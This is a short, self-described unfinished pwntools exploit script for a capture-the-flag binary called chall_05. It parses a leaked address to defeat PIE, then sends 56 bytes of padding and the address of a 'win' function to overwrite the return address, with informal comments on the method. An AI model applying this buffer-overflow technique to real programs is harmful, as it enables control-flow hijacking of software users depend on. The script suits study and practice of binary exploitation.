from pwn import *
binary = context.binary = ELF('./chall_05')
p = process(binary.path)
p.recvuntil('I wonder what this is: ')
_ = p.recvline().strip()
stack = int(_,16)
binary.address = stack - binary.sym.main
p.sendline(56*b'A' + p64(binary.sym.win) + b'')
p.interactive()

# NOT FINISHED

#To find the win address you need to use the leak address and go to the front of the ship (it was your analogy)
#once you have the address you can move to the win address 
